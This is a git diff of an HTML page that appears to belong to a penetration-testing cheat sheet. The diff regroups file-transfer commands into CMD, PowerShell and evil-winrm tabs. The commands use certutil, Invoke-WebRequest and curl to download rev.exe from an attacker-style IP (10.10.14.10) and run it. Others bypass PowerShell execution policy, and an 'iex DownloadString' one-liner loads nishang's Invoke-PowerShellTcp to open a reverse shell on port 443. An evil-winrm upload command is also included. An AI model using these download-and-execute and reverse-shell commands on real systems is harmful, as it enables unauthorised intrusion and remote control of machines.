@@ -193,24 +193,45 @@
 </ul>
 
 <div class="content"><hr>
-<h3 id="http">HTTP</h3>
-<h4 id="start-a-local-http-server">Start a Local HTTP Server</h4>
+<p>
+<button data-tabset="set1" data-tabcontent="tab1" class="active">CMD</button>
+
+<button data-tabset="set1" data-tabcontent="tab2" >Powershell</button>
+
+<button data-tabset="set1" data-tabcontent="tab3" >evil-winrm</button>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><h4 id="start-a-local-http-server">Start a Local HTTP Server</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 -m http.server <span class="m">80</span>
-</span></span></code></pre></div><h4 id="cmd">cmd</h4>
+</span></span></code></pre></div></div>
+<br>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certutil -urlcache -split -f http://10.10.14.10/rev.exe C:<span class="se">\P</span>rogramData<span class="se">\r</span>ev.exe
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Upload and Run</span>
 </span></span><span class="line"><span class="cl">certutil -urlcache -split -f http://10.10.14.10/rev.exe C:<span class="se">\P</span>rogramData<span class="se">\r</span>ev.exe <span class="o">&amp;&amp;</span> C:<span class="se">\P</span>rogramData<span class="se">\r</span>ev.exe
-</span></span></code></pre></div><h4 id="powershell">powershell</h4>
+</span></span></code></pre></div></div>
+</div>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><h4 id="start-a-local-http-server">Start a Local HTTP Server</h4>
+<div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 -m http.server <span class="m">80</span>
+</span></span></code></pre></div></div>
+<br>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Long version</span>
 </span></span><span class="line"><span class="cl"><span class="nb">Invoke-WebRequest</span> <span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="mf">10</span><span class="p">/</span><span class="n">rev</span><span class="p">.</span><span class="py">exe</span> <span class="n">-OutFile</span> <span class="n">C:</span><span class="p">\</span><span class="n">ProgramData</span><span class="p">\</span><span class="n">rev</span><span class="p">.</span><span class="py">exe</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Short version</span>
 </span></span><span class="line"><span class="cl"><span class="nb">iwr </span><span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="mf">10</span><span class="p">/</span><span class="n">rev</span><span class="p">.</span><span class="py">exe</span> <span class="n">-o</span> <span class="n">C:</span><span class="p">\</span><span class="n">ProgramData</span><span class="p">\</span><span class="n">rev</span><span class="p">.</span><span class="py">exe</span>
 </span></span></code></pre></div><p><small><em>Note: PowerShell 3.0+</em></small></p>
+</div>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Long version</span>
 </span></span><span class="line"><span class="cl"><span class="n">powershell</span><span class="p">.</span><span class="py">exe</span> <span class="n">-ExecutionPolicy</span> <span class="n">bypass</span> <span class="nb">curl </span><span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="mf">10</span><span class="p">/</span><span class="n">rev</span><span class="p">.</span><span class="py">exe</span> <span class="n">-o</span> <span class="n">C:</span><span class="p">\</span><span class="n">ProgramData</span><span class="p">\</span><span class="n">rev</span><span class="p">.</span><span class="py">exe</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Short version</span>
 </span></span><span class="line"><span class="cl"><span class="n">powershell</span> <span class="n">-ep</span> <span class="n">bypass</span> <span class="nb">curl </span><span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="mf">10</span><span class="p">/</span><span class="n">rev</span><span class="p">.</span><span class="py">exe</span> <span class="n">-o</span> <span class="n">C:</span><span class="p">\</span><span class="n">ProgramData</span><span class="p">\</span><span class="n">rev</span><span class="p">.</span><span class="py">exe</span>
 </span></span></code></pre></div><p><small><em>Note: curl is not always available</em></small></p>
+</div>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Load into memory and Run</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Long version</span>
 </span></span><span class="line"><span class="cl"><span class="nb">Invoke-Expression</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="py">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://10.10.14.10/rev.ps1&#39;</span><span class="p">);</span><span class="nb">Invoke-PowerShellTcp</span> <span class="n">-Reverse</span> <span class="n">-IPAddress</span> <span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="py">10</span> <span class="n">-Port</span> <span class="mf">443</span>
@@ -218,12 +239,16 @@
 </span></span><span class="line"><span class="cl"><span class="nb">iex </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="py">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://10.10.14.10/rev.ps1&#39;</span><span class="p">);</span><span class="nb">Invoke-PowerShellTcp</span> <span class="n">-Reverse</span> <span class="n">-IPAddress</span> <span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="py">10</span> <span class="n">-Port</span> <span class="mf">443</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Combined version</span>
 </span></span><span class="line"><span class="cl"><span class="nb">iex </span><span class="p">(</span><span class="nb">iwr </span><span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="mf">10</span><span class="p">/</span><span class="n">rev</span><span class="p">.</span><span class="n">ps1</span><span class="p">)</span>
-</span></span></code></pre></div><p><small><em>Note: <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">rev.ps1</a></em></small></p>
-<hr>
-<h3 id="evil-winrm">Evil-winrm</h3>
+</span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">rev.ps1</a></em></small></p>
+</div>
+</div>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab3"><div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Evil-winrm built-in function</span>
 </span></span><span class="line"><span class="cl">upload <span class="s2">&#34;/tmp/example.txt&#34;</span> <span class="s2">&#34;C:\ProgramData\example.txt&#34;</span>
-</span></span></code></pre></div><br></div></div>
+</span></span></code></pre></div></div>
+</div></p>
+<br></div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
